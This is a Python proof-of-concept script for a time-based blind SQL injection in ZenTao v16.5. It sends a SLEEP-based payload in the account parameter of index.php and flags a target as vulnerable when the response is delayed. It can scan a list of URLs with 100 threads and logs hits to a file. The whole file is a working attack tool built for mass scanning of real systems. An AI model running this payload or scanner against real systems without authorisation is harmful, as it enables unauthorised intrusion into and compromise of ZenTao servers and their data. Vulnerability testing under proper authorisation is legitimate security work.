# 禅道v16.5_SQL注入漏洞
import argparse, requests, sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()


def banner():
    banner = '''  
                                   author:MOYV  
'''
    print(banner)


def poc(target):
    url = target + "/zentao/index.php?account=admin%27%20AND%20(SELECT%201337%20FROM%20(SELECT(SLEEP(5)))a)--%20b"
    headers = {
        "User-Agent": "Mozilla/5.0(WindowsNT10.0;Win64;x64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/128.0.0.0Safari/537.36",
    }

    try:
        res = requests.get(url=url, headers=headers, verify=False)
        if res.elapsed.total_seconds() >= 5:
                print(f"[+]{target}存在SQL注入")
                with open('../day06/result.txt', 'a', encoding='utf-8') as f:
                    f.write(f"{target}存在SQL注入\n")
        else:
            print(f"[-]{target}不存在SQL注入")
    except:
        print(f"[!]{target}可能存在问题，请手动检测")


def main():
    banner()
    parse = argparse.ArgumentParser(description="禅道v16.5_SQL注入漏洞脚本")
    parse.add_argument("-u", "--url", dest="url", type=str, help="Please enter url")
    parse.add_argument("-f", "--file", dest="file", type=str, help="Please enter file")
    args = parse.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, "r", encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n", ""))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")

if __name__ == '__main__':
    main()